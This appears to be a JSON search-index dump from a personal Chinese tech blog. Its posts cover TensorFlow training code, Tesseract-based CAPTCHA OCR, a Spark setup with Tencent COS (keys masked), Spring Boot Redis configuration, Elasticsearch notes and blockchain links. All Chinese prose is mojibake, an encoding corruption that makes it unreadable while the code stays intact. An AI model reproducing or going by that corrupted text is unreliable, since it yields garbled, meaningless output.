#xxåœ¨-3åˆ°3ä¹‹é—´ä»¥æ­¥é•¿ä¸º0.01ï¼Œyyåœ¨-3åˆ°3ä¹‹é—´ä»¥æ­¥é•¿0.01,ç”ŸæˆäºŒç»´ç½‘æ ¼åæ ‡ç‚¹ xx, yy = np.mgrid[-3:3:.01, -3:3:.01] #å°†xx , yyæ‹‰ç›´ï¼Œå¹¶åˆå¹¶æˆä¸€ä¸ª2åˆ—çš„çŸ©é˜µï¼Œå¾—åˆ°ä¸€ä¸ªç½‘æ ¼åæ ‡ç‚¹çš„é›†åˆ grid = np.c_[xx.ravel(), yy.ravel()] #å°†ç½‘æ ¼åæ ‡ç‚¹å–‚å…¥ç¥ç»ç½‘ç»œ ï¼Œprobsä¸ºè¾“å‡º probs = sess.run(y, feed_dict=&#123;x:grid&#125;) #probsçš„shapeè°ƒæ•´æˆxxçš„æ ·å­ probs = probs.reshape(xx.shape) print( \"w1:\\n\",sess.run(w1)) print( \"b1:\\n\",sess.run(b1)) print( \"w2:\\n\",sess.run(w2)) print( \"b2:\\n\",sess.run(b2))plt.scatter(X[:,0], X[:,1], c=np.squeeze(Y_c))plt.contour(xx, yy, probs, levels=[.5])plt.show()#å®šä¹‰åå‘ä¼ æ’­æ–¹æ³•ï¼šåŒ…å«æ­£åˆ™åŒ–train_step = tf.train.AdamOptimizer(0.0001).minimize(loss_total)with tf.Session() as sess: init_op = tf.global_variables_initializer() sess.run(init_op) STEPS = 40000 for i in range(STEPS): start = (i*BATCH_SIZE) % 300 end = start + BATCH_SIZE sess.run(train_step, feed_dict=&#123;x: X[start:end], y_:Y_[start:end]&#125;) if i % 2000 == 0: loss_v = sess.run(loss_total, feed_dict=&#123;x:X,y_:Y_&#125;) print((\"After %d steps, loss is: %f\" %(i, loss_v))) xx, yy = np.mgrid[-3:3:.01, -3:3:.01] grid = np.c_[xx.ravel(), yy.ravel()] probs = sess.run(y, feed_dict=&#123;x:grid&#125;) probs = probs.reshape(xx.shape) print( \"w1:\\n\",sess.run(w1)) print( \"b1:\\n\",sess.run(b1)) print( \"w2:\\n\",sess.run(w2)) print( \"b2:\\n\",sess.run(b2))plt.scatter(X[:,0], X[:,1], c=np.squeeze(Y_c)) plt.contour(xx, yy, probs, levels=[.5])plt.show()","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"windows ä½¿ç”¨ tesseract è¯†åˆ«éªŒè¯ç ","slug":"history/tech/5b0e519833380aa24f1fc275","date":"2018-05-29T19:24:08.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5b0e519833380aa24f1fc275/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5b0e519833380aa24f1fc275/","excerpt":"","text":"ç°åº¦å¤„ç† å¢åŠ å¯¹æ¯”åº¦(å¯é€‰) äºŒå€¼åŒ– é™å™ª å€¾æ–œæ ¡æ­£åˆ†å‰²å­—ç¬¦ å»ºç«‹è®­ç»ƒåº“ è¯†åˆ« å®‰è£… python æ‰€éœ€çš„åŒ…:12pip install pillow pip install pytesseractä¸‹è½½ tesseractï¼š1https://github.com/UB-Mannheim/tesseract/wikiæ·»åŠ  tesseract_cmd12345678910from PIL import Imageimport PIL.ImageOpsimport pytesseractpytesseract.pytesseract.tesseract_cmd = &apos;C:\\\\Program Files (x86)\\\\Tesseract-OCR\\\\tesseract.exe&apos;img = Image.open(&apos;./in.jpg&apos;)# è½¬åŒ–ä¸ºç°åº¦imgry = img.convert(&apos;L&apos;)print (pytesseract.image_to_string(imgry))......å‚è€ƒèµ„æ–™ï¼šhttps://github.com/kuszaj/claptchahttp://www.hi-roy.com/2017/09/19/PythonéªŒè¯ç è¯†åˆ«/","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"python æ–‡ä»¶ç¼–ç ","slug":"history/tech/5b0c9c8133380aa24f1fc26e","date":"2018-05-29T00:19:13.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5b0c9c8133380aa24f1fc26e/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5b0c9c8133380aa24f1fc26e/","excerpt":"","text":"ç¬¦åˆæ­£åˆ™è¡¨è¾¾å¼å³å¯ï¼š1&quot;coding[:=]\\s*([-\\w.]+)&quot;ç¬¦åˆæ¡ä»¶çš„å¦‚ä¸‹ï¼š123456#coding=&lt;encoding name&gt; æˆ–# -*- coding: &lt;encoding name&gt; -*- æˆ–#!/usr/bin/python # vim: set fileencoding=&lt;encoding name&gt; :","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"è‡ªå»ºSpark + è…¾è®¯äº‘COS æ•°æ®æº","slug":"history/tech/5b0cf7fd33380aa24f1fc26f","date":"2018-05-28T18:49:33.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5b0cf7fd33380aa24f1fc26f/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5b0cf7fd33380aa24f1fc26f/","excerpt":"","text":"ç¬¬ä¸€æ­¥å…ˆç¼–è¯‘è…¾è®¯äº‘æä¾›çš„Hadoop æ’ä»¶jar hadoop-cos-2.7.21234git clone https://github.com/tencentyun/cos-java-sdk-hadoop-v4cd cos-java-sdk-hadoop-v4è¿è¡Œä»¥ä¸‹å‘½ä»¤è¿›è¡Œç¼–è¯‘ï¼Œè·å– target ç›®å½•ä¸‹çš„ cos_api-4.2.jarï¼šmvn clean package -Dmaven.test.skip=true12345678910111213141516171819202122 git clone https://github.com/tencentyun/hadoop-cosn-v4 cd hadoop-cosn-v4 å› ä¸º cosn ä¾èµ– SDKï¼Œè¯·å°†ä¸Šä¸€æ­¥ç¼–è¯‘çš„ cos_api-4.2.jar æ‹·è´åˆ° src/main/resources ä¸‹ï¼Œç„¶åè¿è¡Œä»¥ä¸‹å‘½ä»¤è¿›è¡Œç¼–è¯‘ï¼Œè·å– target ç›®å½•ä¸‹çš„ hadoop-cos-2.7.2.jarï¼š mvn clean package -Dmaven.test.skip=true``` æ­å»ºä½ è‡ªå·±æ˜¯Spark å·¥ç¨‹ã€‚æˆ‘è¿™é‡Œä½¿ç”¨çš„æ˜¯Spark 2.2.0å°†è·å–çš„hadoop-cos-2.7.2.jar æ‰‹åŠ¨æ·»åŠ åˆ°å·¥ç¨‹ æˆ–è€… æ”¾åœ¨è‡ªå·±çš„mavenç§æœé‡Œé¢åŠ å…¥éƒ½å¯ä»¥ã€‚æˆ‘è¿™é‡Œä½¿ç”¨çš„è‡ªå·±çš„ç§æœã€‚ &lt;dependency&gt; &lt;groupId&gt;com.qcloud.hadoop-cos&lt;/groupId&gt; &lt;artifactId&gt;hadoop-cos&lt;/artifactId&gt; &lt;version&gt;2.7.2&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.qcloud&lt;/groupId&gt; &lt;artifactId&gt;cos_api&lt;/artifactId&gt; &lt;version&gt;4.2&lt;/version&gt; &lt;/dependency&gt;ç¼–å†™Spark æµ‹è¯•ç±»CosTestï¼šobject CosTest extends Logging { def main(args: Array[String]): Unit = { val conf = new SparkConf().setAppName(&quot;CosTest&quot;) conf.setMaster(&quot;local[1]&quot;) .set(&quot;spark.executor.memory&quot;, &quot;8g&quot;) .set(&quot;spark.local.dir&quot;, &quot;spark_dir&quot;) .set(&quot;spark.broadcast.compress&quot;, &quot;true&quot;) .set(&quot;spark.rdd.compress&quot;, &quot;true&quot;) .set(&quot;spark.serializer&quot;, &quot;org.apache.spark.serializer.KryoSerializer&quot;) .set(&quot;spark.hadoop.fs.cos.userinfo.appid&quot;, &quot;1252448703&quot;) .set(&quot;spark.hadoop.fs.cos.userinfo.secretId&quot;, &quot;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&quot;) .set(&quot;spark.hadoop.fs.cos.userinfo.secretKey&quot;, &quot;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&quot;) .set(&quot;spark.hadoop.fs.cosn.impl&quot;, &quot;org.apache.hadoop.fs.cosnative.NativeCosFileSystem&quot;) .set(&quot;spark.hadoop.fs.cos.userinfo.region&quot;, &quot;tj&quot;) AppUtils.execute((cmd: CommandLine) =&gt; { (true, &quot;CosTest test&quot;) })(() =&gt; conf)(f = (cmd: CommandLine, spark: SparkSession) =&gt; { val rdd = spark.sparkContext.textFile(&quot;cosn://bucketName/***.csv&quot;) val count = rdd.count() rdd.foreach(println) println(s&quot;count: $count&quot;) })(args, OssTest.getClass.getSimpleName, options) } } å‰©ä¸‹çš„è‡ªå·±æ…¢æ…¢ç©ç©å§ã€‚èºèµ·æ¥","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"Spark","slug":"Spark","permalink":"https://wangxiuwen.github.io/tags/Spark/"},{"name":"COS","slug":"COS","permalink":"https://wangxiuwen.github.io/tags/COS/"},{"name":"è…¾è®¯äº‘","slug":"è…¾è®¯äº‘","permalink":"https://wangxiuwen.github.io/tags/%E8%85%BE%E8%AE%AF%E4%BA%91/"}],"author":"baipeng"},{"title":"tensorflow GPU ç‰ˆæœ¬å®‰è£…","slug":"history/tech/5b0b779633380aa24f1fc26d","date":"2018-05-28T03:29:26.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5b0b779633380aa24f1fc26d/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5b0b779633380aa24f1fc26d/","excerpt":"","text":"å®‰è£… python 3.5å®‰è£… CUDA Drivershttps://docs.nvidia.com/cuda/cuda-installation-guide-microsoft-windows/#axzz4Vh7B32MZä¸‹è½½cuDNN - CUDA for Deep Neural Networks å¹¶æ”¾å…¥ç¯å¢ƒå˜é‡https://developer.nvidia.com/cudnnå®‰è£… tensorflow gpu1pip install --upgrade tensorflow-gpu","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"æ‘„åƒé•œå¤´çš„é€‰è´­","slug":"history/shoot/5b0b647233380aa24f1fc26c","date":"2018-05-28T02:07:46.000Z","updated":"2020-11-29T01:42:08.747Z","comments":true,"path":"history/shoot/5b0b647233380aa24f1fc26c/","link":"","permalink":"https://wangxiuwen.github.io/history/shoot/5b0b647233380aa24f1fc26c/","excerpt":"","text":"","categories":[{"name":"æ‘„å½±","slug":"æ‘„å½±","permalink":"https://wangxiuwen.github.io/categories/%E6%91%84%E5%BD%B1/"}],"tags":[{"name":"shoot","slug":"shoot","permalink":"https://wangxiuwen.github.io/tags/shoot/"},{"name":"æ‘„å½±","slug":"æ‘„å½±","permalink":"https://wangxiuwen.github.io/tags/%E6%91%84%E5%BD%B1/"}],"author":"wangxiuwen"},{"title":"å£°éŸ³çš„å››ä¸ªé˜¶æ®µ","slug":"history/tech/5b0b643133380aa24f1fc26b","date":"2018-05-28T02:06:41.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5b0b643133380aa24f1fc26b/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5b0b643133380aa24f1fc26b/","excerpt":"","text":"","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"cubase äººå£°çš„å¤„ç†","slug":"history/music/5b0b630b33380aa24f1fc26a","date":"2018-05-28T02:01:47.000Z","updated":"2020-11-29T01:42:08.743Z","comments":true,"path":"history/music/5b0b630b33380aa24f1fc26a/","link":"","permalink":"https://wangxiuwen.github.io/history/music/5b0b630b33380aa24f1fc26a/","excerpt":"","text":"","categories":[{"name":"éŸ³ä¹","slug":"éŸ³ä¹","permalink":"https://wangxiuwen.github.io/categories/%E9%9F%B3%E4%B9%90/"}],"tags":[{"name":"music","slug":"music","permalink":"https://wangxiuwen.github.io/tags/music/"},{"name":"éŸ³ä¹","slug":"éŸ³ä¹","permalink":"https://wangxiuwen.github.io/tags/%E9%9F%B3%E4%B9%90/"}],"author":"wangxiuwen"},{"title":"Spring boot 2.0 é—®é¢˜æ±‡æ€»","slug":"history/tech/5b07b8e4ab7ec5414e74c869","date":"2018-05-24T19:19:00.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5b07b8e4ab7ec5414e74c869/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5b07b8e4ab7ec5414e74c869/","excerpt":"","text":"ä½¿ç”¨Druid æ›´é«˜ç‰ˆæœ¬çš„ã€‚ 2.0 ä»¥ä¸Šç‰ˆæœ¬é…ç½®å¤šæ•°æ®æºã€‚ç‚¹å‡»æŸ¥çœ‹æ–‡æ¡£","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"baipeng"},{"title":"ä½¿ç”¨ openssl æŸ¥çœ‹è¯ä¹¦","slug":"history/tech/5b002d24ab7ec5414e74c868","date":"2018-05-19T01:56:52.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5b002d24ab7ec5414e74c868/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5b002d24ab7ec5414e74c868/","excerpt":"","text":"ä½¿ç”¨ openssl æŸ¥çœ‹è¯ä¹¦ï¼š1openssl x509 -in server.crt -text","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"elasticsearch-5.5.0 å–æ¶ˆèšåˆ size=0","slug":"history/tech/5afe48e4ab7ec5414e74c862","date":"2018-05-18T03:30:44.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5afe48e4ab7ec5414e74c862/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5afe48e4ab7ec5414e74c862/","excerpt":"","text":"issues å¦‚ä¸‹1https://github.com/elastic/elasticsearch/issues/18838","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"Spark ä¸­ä½¿ç”¨Rediså®¹æ˜“å‡ºç°çš„é”™è¯¯","slug":"history/tech/5afee588ab7ec5414e74c867","date":"2018-05-18T02:39:04.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5afee588ab7ec5414e74c867/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5afee588ab7ec5414e74c867/","excerpt":"","text":"Spark ä¸­ä½¿ç”¨Rediså®¹æ˜“å‡ºç°çš„é”™è¯¯ï¼šä½¿ç”¨client æ“ä½œå ä¸€å®šè¦æ‰‹åŠ¨closeæ‰ï¼Œå¦åˆ™å½“çº¿ç¨‹ä¸­æ²¡æœ‰å¯ç”¨çš„clent åï¼Œçº¿ç¨‹æ± ä¼šå¤„äºç­‰å¾…çŠ¶æ€å¯¼è‡´å¡æ­»ï¼Œå¯¼è‡´sparkä½œä¸šå¡ä½ã€‚ æ•°æ®åºåˆ—åŒ–é—®é¢˜","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"baipeng"},{"title":"elasticsearch-5.5.0 æ—¥æœŸç›´æ–¹å›¾èšåˆå°å‘ sdk Java","slug":"history/tech/5afee3f6ab7ec5414e74c866","date":"2018-05-18T02:32:22.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5afee3f6ab7ec5414e74c866/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5afee3f6ab7ec5414e74c866/","excerpt":"","text":"åŸå…ˆçš„Intervalæ–¹æ³•è®¾ç½®DateHistogramInterval ç°å·²æ”¹ä¸ºdateHistogramIntervalæ–¹æ³•è®¾ç½®ã€‚timeZone è®¾ç½®æ—¶åºä»åŸå…ˆçš„timeZone(&quot;+08:00&quot;) æ›´æ”¹ä¸º æ”¾è¿›å»ä¸€ä¸ªDateTimeZone å¯¹è±¡DateTimeZone.forID(&quot;+08:00&quot;) AggregationBuilders .dateHistogram(AnalyticsConver.AGG_ALL_RESULT) .field(timeKey) .dateHistogramInterval(dateHistogramType.getHistogram()) .format(dateHistogramType.getFormat()) .minDocCount(0L) .order(Histogram.Order.KEY_DESC) .timeZone(DateTimeZone.forID(&quot;+08:00&quot;));","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"baipeng"},{"title":"Spring boot 2.0  Redis  é›†æˆ","slug":"history/tech/5afedfe6ab7ec5414e74c863","date":"2018-05-18T02:15:02.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5afedfe6ab7ec5414e74c863/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5afedfe6ab7ec5414e74c863/","excerpt":"","text":"ä½¿ç”¨é»˜è®¤çš„lettuce åšRedisçš„é“¾æ¥å®¢æˆ·ç«¯ï¼Œvalueåºåˆ—åŒ– ä½¿ç”¨è‡ªå®šä¹‰çš„FastJsonRedisSerializeråŠ å…¥ä¾èµ–æ–¹é¢æ³¨æ„åŠ å…¥commons-pool2lettuce ä½¿ç”¨äº†commons-pool2çš„è¿æ¥æ±  &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-data-redis&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.commons&lt;/groupId&gt; &lt;artifactId&gt;commons-pool2&lt;/artifactId&gt; &lt;version&gt;2.5.0&lt;/version&gt; &lt;/dependency&gt; public class FastJsonRedisSerializer&lt;T&gt; implements RedisSerializer&lt;T&gt; { public static final Charset DEFAULT_CHARSET = StandardCharsets.UTF_8; private Class&lt;T&gt; clazz; public FastJsonRedisSerializer(Class&lt;T&gt; clazz) { super(); this.clazz = clazz; } @Override public byte[] serialize(T t) throws SerializationException { if (null == t) { return new byte[0]; } return JSON.toJSONString(t, SerializerFeature.WriteClassName).getBytes(DEFAULT_CHARSET); } @Override public T deserialize(byte[] bytes) throws SerializationException { if (null == bytes || bytes.length &lt;= 0) { return null; } return JSON.parseObject(bytes, clazz); } }å®šä¹‰CacheConfig@Beanpublic KeyGenerator wiselyKeyGenerator() {return (target, method, params) -&gt; Joiner.on(&quot;&quot;).join(target.getClass().getName(), method.getName(), params);} @Bean public RedisTemplate&lt;String, String&gt; redisTemplate( RedisConnectionFactory factory) { StringRedisTemplate template = new StringRedisTemplate(factory); FastJsonRedisSerializer fastJsonRedisSerializer = new FastJsonRedisSerializer(Object.class); template.setValueSerializer(fastJsonRedisSerializer); template.setKeySerializer(new StringRedisSerializer()); template.setHashKeySerializer(new StringRedisSerializer()); template.setConnectionFactory(factory); template.afterPropertiesSet(); return template; } @Bean public CacheManager cacheManager(RedisConnectionFactory redisConnectionFactory) { RedisCacheManager.RedisCacheManagerBuilder builder = RedisCacheManager .RedisCacheManagerBuilder .fromConnectionFactory(redisConnectionFactory); return builder.build(); }","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"redis","slug":"redis","permalink":"https://wangxiuwen.github.io/tags/redis/"},{"name":"springboot","slug":"springboot","permalink":"https://wangxiuwen.github.io/tags/springboot/"}],"author":"baipeng"},{"title":"Hyperledger Fabric åŸºç¡€æ¦‚å¿µ","slug":"history/tech/5afe2c00ab7ec5414e74c861","date":"2018-05-18T01:27:28.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5afe2c00ab7ec5414e74c861/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5afe2c00ab7ec5414e74c861/","excerpt":"","text":"Ancor peerè´Ÿè´£ä¸ºåŠ å…¥çš„æ–°èŠ‚ç‚¹åŒæ­¥æ•°æ® channel1.0 ç‰ˆæœ¬ä»¥åå¼•å…¥ï¼Œä¸åŒé€šé“ä¹‹é—´çš„æ•°æ®å½¼æ­¤éš”ç¦»ã€‚ç›®çš„æ˜¯ä¿æŠ¤éšç§ï¼Œåœ¨channel Aä¸­çš„èŠ‚ç‚¹çœ‹ä¸åˆ° channel B ä¸­çš„ transaction commitmentpeer åœ¨æäº¤ transaction çš„ block åˆ°è´¦æœ¬ä¸­çš„æ—¶å€™çš„åŠ¨ä½œ Concurrentcy Control Version Checkå¹¶å‘ç‰ˆæœ¬æ§åˆ¶ã€‚åœ¨ç›¸åŒ channel ä¸åŒ peer å¯¹åŒä¸€ä¸ª world state åšäº†ä¿®æ”¹ï¼Œä¸ºäº†ä¿è¯æ•°æ®ä¸€è‡´æ€§ï¼Œè¦å¯¹è¿™ä¸ªçŠ¶æ€åšæ§åˆ¶ã€‚ Configuration Blockä½¿ç”¨ Configuration Block å¯ä»¥åšä¸€äº›é…ç½® Consensuså…±è¯† Current Stateä¸–ç•ŒçŠ¶æ€çš„æœ€æ–°çŠ¶æ€ Dynamic Merbership EndorsementèƒŒä¹¦ ã€‚æ¨¡æ‹Ÿæ‰§è¡Œ chaincode çš„è¿‡ç¨‹ Hyperledger Fabric CAåœ¨ä¼ä¸šçº§è”ç›Ÿé“¾ä¸­ä¸ºèŠ‚ç‚¹é¢å‘è¯ä¹¦ï¼Œè®©èŠ‚ç‚¹å¯ä»¥è®¤è¯è¿›å…¥é“¾ä¸­ Genesis Blockåˆ›ä¸–åŒºå— Gossip Protocolå®ƒå¯ä»¥åœ¨P2P ç½‘ç»œä¸­å‘ç°èŠ‚ç‚¹ï¼ŒåŒæ­¥ ledger data Ledgerå³è´¦æœ¬ã€‚ä¸€ä¸ªè´¦æœ¬åŒ…å«ä¸¤éƒ¨åˆ†ï¼ŒåŒºå—é“¾ä¿å­˜åœ¨ç£ç›˜ä¸­ï¼Œä¸–ç•ŒçŠ¶æ€å­˜å‚¨åœ¨ state db ä¸­ Memberå‚ä¸äº¤æ˜“çš„éƒ½ç®— Member, peer ã€order ã€clientç«¯éƒ½ç®— Mebership Service Provideræä¾› Member è®¤è¯çš„æœåŠ¡ Order Serviceè®©äº¤æ˜“é¡ºåºè¾¾æˆå…±è¯† PeeråŒºå—é“¾ç½‘ç»œä¸­çš„èŠ‚ç‚¹ Proposalæ‰€æœ‰èƒ½è§¦å‘ transaction çš„åŠ¨ä½œ Queryå°±æ˜¯è¯»å– state DataBase ä¸­çš„æ•°æ® State Databaseå­˜å‚¨çŠ¶æ€çš„æ•°æ®åº“ System Chainç»´æŠ¤æ•´ä¸ª chain çš„ Transationæ¯æ¬¡äº¤æ˜“éƒ½æ˜¯ä¸€ä¸ª transation","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"åŒºå—é“¾èµ„æºè´´","slug":"history/tech/5afe27fbab7ec5414e74c860","date":"2018-05-18T01:10:19.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5afe27fbab7ec5414e74c860/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5afe27fbab7ec5414e74c860/","excerpt":"","text":"åºå·é¡¹ç›®åç§°é¡¹ç›®ç±»å‹é¡¹ç›®åœ°å€å¤‡æ³¨ç²¾é€šæ¯”ç‰¹å¸http://book.8btc.com/books/1/master_bitcoin/_book/1ç¤¾åŒºhttp://hiblock.net/2ä¸€èµ·å­¦ä¹ ä»¥å¤ªåŠé¡¹ç›®https://github.com/etherchina/ethereum3ä»¥å¤ªåŠæºç åˆ†æé¡¹ç›®https://github.com/ZtesoftCS/go-ethereum-code-analysis/4ä»¥å¤ªåƒµå°¸æ¸¸æˆhttps://cryptozombies.io/zh/5è¶…çº§è´¦æœ¬(Hyperledger)é¡¹ç›®https://cn.hyperledger.org/Slack: https://hyperledgerproject.slack.comGerrit: https://gerrit.hyperledger.orgWiki: https://wiki.hyperledger.comä¸­å›½å·¥ä½œç»„: wiki.hyperledger.org/groups/tsc/technical-working-group-chinaé¡¹ç›®https://openzeppelin.org/è®©solidityæ›´å®‰å…¨ä»¥å¤ªåŠé’±åŒ…https://metamask.io/chromeå’Œ firefox æ‰©å±•ä»¥å¤ªåŠWeb3 Providerhttps://infura.io/ä»¥å¤ªåŠå®˜ç½‘æ–‡æ¡£ä¸­æ–‡ç‰ˆhttps://www.beibq.cn/book/74dk197-6818ä»¥å¤ªåŠèµ„æºethstats.netï¼šå®æ—¶æŸ¥çœ‹ç½‘ç»œçš„ä¿¡æ¯ï¼Œå¦‚åŒºå—ã€ä»·æ ¼ã€äº¤æ˜“æ•°ç­‰ã€‚ethernodes.orgï¼šæ˜¾ç¤ºæ•´ä¸ªç½‘ç»œçš„å†å²ç»Ÿè®¡ä¿¡æ¯ï¼Œå¦‚å®¢æˆ·ç«¯çš„åˆ†å¸ƒæƒ…å†µç­‰ã€‚dapps.ethercasts.comï¼šæŸ¥çœ‹è¿è¡Œåœ¨ä»¥å¤ªåŠä¸Šçš„ DApp çš„ä¿¡æ¯ï¼ŒåŒ…æ‹¬ç®€ä»‹ã€æ‰€å¤„é˜¶æ®µå’ŒçŠ¶æ€ç­‰ã€‚åŒºå—é“¾æŠ€æœ¯æŒ‡å—https://legacy.gitbook.com/book/yeasy/blockchain_guide/detailsæ™ºé“¾æŠ€æœ¯æ–‡æ¡£https://wiki.chainnova.com/pages/viewpage.action?pageId=13369449æ™ºé“¾ 